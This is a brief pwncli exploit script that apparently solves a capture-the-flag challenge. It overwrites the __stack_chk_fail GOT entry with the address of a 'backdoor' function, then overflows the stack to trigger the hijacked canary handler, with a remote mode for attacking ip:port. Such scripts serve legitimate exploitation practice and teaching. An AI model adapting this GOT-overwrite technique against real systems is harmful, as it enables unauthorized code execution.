#!/usr/bin/env python3
# Date: 2025-07-04 15:36:43
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

backdoor=0x401242
rl()
s(p64(elf.got['__stack_chk_fail']))
rl()
s(p64(backdoor))
rl()
s('a'*100)
ia()
